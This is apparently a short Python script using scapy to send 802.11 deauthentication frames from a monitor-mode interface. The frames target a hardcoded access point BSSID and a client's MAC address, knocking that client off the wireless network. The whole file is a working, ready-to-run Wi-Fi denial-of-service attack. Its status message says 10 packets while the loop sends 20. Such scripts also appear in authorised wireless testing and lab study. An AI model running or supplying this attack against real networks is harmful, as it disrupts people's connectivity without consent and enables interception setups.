#!/usr/bin/env python3

import sys
import json
import csv
import re
import os
import time
import signal
import threading
import subprocess
import random
import contextlib
import math

from datetime import datetime
from scapy.all import *

interface = "radio0mon"
ch = 11
target_ap_bssid = '04:5e:a4:6a:28:47'
cli_mac_phone = '9a:b5:9e:c0:fe:eb'
cli_mac_notebook = '80:32:53:ae:f8:b2'
broadcast = 'ff:ff:ff:ff:ff:ff'

deauth_attempts = 3
deauth_packet_per_attempt = 20

	
def send_deauth(bssid, cssid):
	global deauth_attempts
	global deauth_packet_per_attempt
	print(f"[+] Send 10-packet deauth to {bssid} as {cssid}")
	deauth_pkt = RadioTap() / Dot11(addr1=cssid, addr2=bssid, addr3=bssid) / Dot11Deauth(reason=7)
	
	for j in range(deauth_packet_per_attempt):
		sendp(deauth_pkt, iface=interface, inter=0.01, verbose=False)

send_deauth(target_ap_bssid, cli_mac_notebook)
